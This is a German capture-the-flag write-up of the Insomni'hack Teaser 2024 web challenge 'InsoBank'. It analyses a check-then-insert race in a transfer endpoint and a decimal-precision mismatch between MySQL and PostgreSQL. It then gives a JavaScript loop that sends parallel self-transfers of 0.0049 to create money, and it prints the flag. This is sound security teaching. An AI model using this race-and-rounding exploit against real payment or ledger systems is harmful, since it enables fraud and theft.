---
title: "Insomni'hack Teaser 2024: InsoBank — Geld aus Rundungsfehlern"
description: "Race-Condition + DECIMAL-Precision-Mismatch zwischen MySQL und PostgreSQL machen 0.0049 + 0.0049 = 0.01 möglich. 337 Iterationen später: Flag."
date: 2024-01-22
category: ctf
tags: [web, race-condition, sql, decimal, ctf]
disclosure: public
lesenswert: true
---

> **Event:** [Insomni'hack Teaser 2024](https://ctftime.org/event/2139/) &middot; **Kategorie:** Web &middot; **Challenge:** InsoBank &middot; **Punkte:** 333 &middot; **Solver:** ich (solo)

Mein erster CTF mit den [Platypwnies](https://platypwnies.de/), dem Team des
HPI &mdash; damals als Schüler dazugestoßen.

Die Challenge:

> We're launching a new online Bank today which is of course backed by crypto
> and AI which makes it better than any other banking system out there.
>
> It's not fully featured yet as you can only transfer money within your own
> accounts, but you can already see how superior it is to other systems.

Ziel: irgendein eigenes Konto mit Balance > 13.37 CHF. Startkapital pro User:
10 CHF auf dem *Current Account*, 0 auf zwei weiteren.

## TL;DR

1. Source kommt mit der Challenge &mdash; zwei Datenbanken im Spiel: MySQL (`DECIMAL(10,2)`) und PostgreSQL (`decimal`, unbegrenzt).
2. Der `/transfer`-Endpoint prüft `count(*)` und inserted danach &mdash; ohne Lock zwischen den beiden. Race &rarr; zwei Transfers an denselben Recipient im selben Batch, obwohl der Server das verbietet.
3. Beträge von `0.0049` runden in MySQL auf `0.00`, bleiben in PostgreSQL aber erhalten. Nach Validate + Worker-Cron landet die *aggregierte* PG-Summe (`0.0098`) gerundet als **0.01** auf dem Empfängerkonto.
4. Self-Transfer im Loop &rarr; +0.01 pro Iteration. 337-mal &rarr; Flag.

## Architektur

Aus dem `docker-compose.yml` und der Source ergibt sich:

- **Frontend:** Next.js, ohne eigene Logik (nur API-Wrapper)
- **API:** Flask (`api/app.py`), JWT-Auth
- **MySQL:** Quelle der Wahrheit für `accounts`, `batches`, `users`. `amount` und `balance` als `DECIMAL(10,2)`.
- **PostgreSQL:** zweite Kopie der `batch_transactions` &mdash; aber: `amount decimal` (volle Präzision)
- **Worker:** `api/exec_transfers.py`, läuft per Cron, liest aus **PostgreSQL**, schreibt in **MySQL**

Der Workflow für eine Überweisung:

1. `POST /batch/new` &rarr; legt einen leeren Batch an
2. `POST /transfer` &rarr; fügt eine Transaktion in den Batch ein (in **beiden** DBs)
3. `POST /validate` &rarr; sperrt MySQL-Tabellen, prüft ob Sender genug Balance hat, zieht Summe ab, markiert Batch als `verified`
4. Cron-Worker schiebt verifizierte Batches durch &mdash; verteilt die Beträge auf die Recipient-Konten

Vier Code-Pfade, zwei DBs, ein Worker dazwischen. Riecht nach
Konsistenzproblemen.

## Static Analysis: zwei Schemas, eine Wahrheit?

Das ist der gesamte Schema-Unterschied:

```sql
-- mysql-start/init.sql
CREATE TABLE batch_transactions (
    id varchar(36),
    batchid varchar(36),
    recipient varchar(36),
    amount DECIMAL(10,2),         -- ← zwei Nachkommastellen
    verified boolean default false,
    executed boolean default false
);
```

```sql
-- pg-start/init.sql
CREATE TABLE batch_transactions (
    id text,
    batchid text,
    sender text,
    recipient text,
    amount decimal,                -- ← unbegrenzte Präzision
    verified boolean default false,
    executed boolean default false
);
```

Sobald ich das gesehen habe, war klar: irgendwo muss ein Betrag entstehen, den
MySQL anders sieht als PostgreSQL. Frage ist nur: wer liest von wem?

## Bug 1: Race im `/transfer`

Der Server verspricht: *"You can only have one transfer per recipient in a
batch"*. Geprüft wird das so (`api/app.py:322`):

```python
cursor.execute('''
    SELECT count(*) FROM batch_transactions WHERE batchid = %s AND recipient = %s
''', (batchid, recipient))
data = cursor.fetchone()
if data[0] > 0:
    return jsonify({"error": "You can only have one transfer per recipient in a batch"})

# … (kein Lock, kein UNIQUE-Constraint, kein SELECT … FOR UPDATE)

cursorpg.execute('''
    LOCK TABLE batch_transactions;
    INSERT INTO batch_transactions ...
''')
cursor.execute('''
    INSERT INTO batch_transactions ...
''')
```

Klassisches Time-of-check / time-of-use. Zwei parallele Requests sehen beide
`count = 0`, beide INSERTen, beide bekommen `200 OK`. Resultat: zwei
Transaktionen mit demselben `(batchid, recipient)`, obwohl der Endpoint
schwört, das könne nicht passieren.

Das `LOCK TABLE` in PostgreSQL hilft hier nicht &mdash; es serialisiert nur die
PG-Inserts unter sich, nicht den vorgelagerten MySQL-`SELECT count(*)`.

## Bug 2: 0.0049 ist nicht 0.0049

Was passiert mit `amount = "0.0049"` in beiden Datenbanken?

| DB | gespeichert | Hintergrund |
|---|---|---|
| MySQL `DECIMAL(10,2)` | `0.00` | Default-Rounding `ROUND_HALF_UP` auf 2 Stellen |
| PostgreSQL `decimal` | `0.0049` | Keine Skala definiert &rarr; volle Präzision |

`/validate` liest die Summe aus **MySQL** und zieht sie vom Sender ab
(`api/app.py:251`):

```python
cursor.execute("LOCK TABLES batch_transactions WRITE, accounts WRITE, batches WRITE")
cursor.execute("SELECT sum(amount) FROM batch_transactions WHERE batchid = %s", (batchid,))
data = cursor.fetchone()
total = data[0]                                      # 0.00 + 0.00 = 0.00
# …
cursor.execute('UPDATE accounts SET balance = (balance - %s) WHERE id = %s',
               (total, senderid))                    # zieht 0 ab
```

Der Worker hingegen liest aus **PostgreSQL** und aggregiert pro Recipient
(`api/exec_transfers.py:46`):

```python
TRANSFERS = {}
for (txid, sender, recipient, amount) in transactions:
    TRANSFERS[recipient] = amount if recipient not in TRANSFERS else TRANSFERS[recipient] + amount
    # 0.0049 + 0.0049 = 0.0098 (PG-Präzision bleibt erhalten)

for recipient in TRANSFERS:
    cursor.execute('UPDATE accounts SET balance = balance + %s WHERE id = %s',
                   (TRANSFERS[recipient], recipient))
    # MySQL DECIMAL(10,2): 10.00 + 0.0098 = 10.0098 → gerundet → 10.01
```

`0.0098` wird beim Schreiben in `accounts.balance` &mdash; wieder
`DECIMAL(10,2)` &mdash; nach oben gerundet, weil `>= 0.005`. **Sender verliert
nichts, Empfänger gewinnt einen Cent.**

## Self-Transfer schließt den Kreis

`/transfer` prüft, dass der Recipient dem User gehört &mdash; aber **nicht**,
dass Sender ≠ Recipient. Also: Sender und Recipient gleich setzen, beide
Effekte landen auf demselben Konto. Pro Loop-Iteration: **+0.01 CHF aus dem
Nichts**.

Von 10 auf 13.37 sind 337 Iterationen.

## Exploit

Der vollständige Loop in JavaScript (vereinfacht):

```javascript
const ACCOUNT_ID = '<account-uuid>';   // das Account mit 10 CHF
const AUTH_TOKEN = '<jwt>';

const post = (path, body) =>
  fetch(`${API_URL}/${path}`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${AUTH_TOKEN}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(body),
  }).then((r) => r.json());

(async () => {
  while (true) {
    const batch = await post('batch/new', { senderid: ACCOUNT_ID });
    const batchid = batch.find((b) => !b.verified && !b.executed).batchid;

    // Zwei parallele Self-Transfers — Race öffnet das Fenster
    await Promise.allSettled([
      post('transfer', { batchid, recipient: ACCOUNT_ID, amount: '0.0049' }),
      post('transfer', { batchid, recipient: ACCOUNT_ID, amount: '0.0049' }),
    ]);

    await new Promise((r) => setTimeout(r, 500));   // Worker einplanen
    await post('validate', { batchid });
  }
})();
```

Drei Endpoints pro Iteration, ~1 Sekunde Wartezeit, ~6 Minuten bis 13.37.

```
All: 337 | Verified: 337 | Executed: 337
```

<details>
<summary>flag</summary>

```
INS{have-I-l0ck3d-you-0ut?}
```

</details>

## Quellen

- Challenge auf [CTFtime](https://ctftime.org/event/2139/tasks/)
- Anderer Writeup zur selben Challenge: [blog.2h0ng.wiki](https://blog.2h0ng.wiki/2024/01/21/Insomni-hack-CTF-Writeup/)
- [Platypwnies](https://platypwnies.de/) &mdash; das HPI-CTF-Team
